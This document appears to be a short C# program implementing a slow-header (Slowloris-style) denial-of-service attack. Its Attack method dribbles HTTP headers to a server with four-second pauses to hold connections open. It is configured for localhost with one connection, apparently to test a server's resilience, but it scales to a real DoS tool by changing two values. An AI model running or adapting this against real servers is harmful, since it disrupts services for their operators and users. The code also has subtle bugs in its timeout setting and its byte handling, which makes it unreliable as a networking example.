using System.Net.Sockets;
using System.Text;


var target = "localhost";
var port = 8000;
var waitTimeBetweenHeaders = TimeSpan.FromSeconds(4);
var responseTimeout = TimeSpan.FromSeconds(5);
var headers = new List<string> {
        "GET / HTTP/1.1\n",
        $"Host: {target}\n",
        "User-Agent: curl/7.68.0\n",
        "Accept: */*\n",
        "Connection: close\n",
        "\n"
    };

var connections = 1;
var tasks = new List<Task<string>>();
for (int i = 0; i < connections; i++)
{
    tasks.Add(Task.Factory.StartNew(() => Attack(target, port, headers, waitTimeBetweenHeaders, responseTimeout)));
}

Task.WhenAll(tasks).Wait();
var errorResults = tasks.Where(t => t.Result.StartsWith("ERROR")).Select(t => t.Result).ToList();
Console.WriteLine($"Finished with {errorResults.Count} errors out of {tasks.Count} requests");
errorResults.ForEach(Console.WriteLine);

static string Attack(string target, int port, List<string> headers, TimeSpan waitToSendNextHeader, TimeSpan responseTimeout)
{
    try
    {
        Console.WriteLine("Connecting");
        using var client = new TcpClient(target, port);
        client.ReceiveTimeout = responseTimeout.Milliseconds;
        using var request = client.GetStream();

        Console.WriteLine("Sending");
        foreach (var header in headers)
        {
            if (request.CanWrite == false)
            {
                Console.WriteLine("Can't write to stream");
                break;
            }
            Console.WriteLine($"Sending {header}");
            var content = Encoding.ASCII.GetBytes(header);
            request.Write(content, 0, content.Length);
            Thread.Sleep(waitToSendNextHeader);
        }

        using var response = client.GetStream();
        var body = new List<int>();
        var resByte = response.ReadByte();
        Console.WriteLine("Receiving");

        while (resByte != -1)
        {
            body.Add(resByte);
            resByte = response.ReadByte();
        }
        byte[] result = new byte[body.Count * sizeof(int)];
        Buffer.BlockCopy(body.ToArray(), 0, result, 0, result.Length);
        Console.WriteLine("Closing");
        request.Close();
        response.Close();
        client.Close();

        Console.WriteLine("Done");
        return Encoding.ASCII.GetString(result);
    }
    catch (SocketException socketEx)
    {
        return $"ERROR - Socket Exception: {socketEx.Message}";
    }
    catch (Exception ex)
    {
        return $"ERROR - Exception During Attack: {ex.Message}";
    }
}
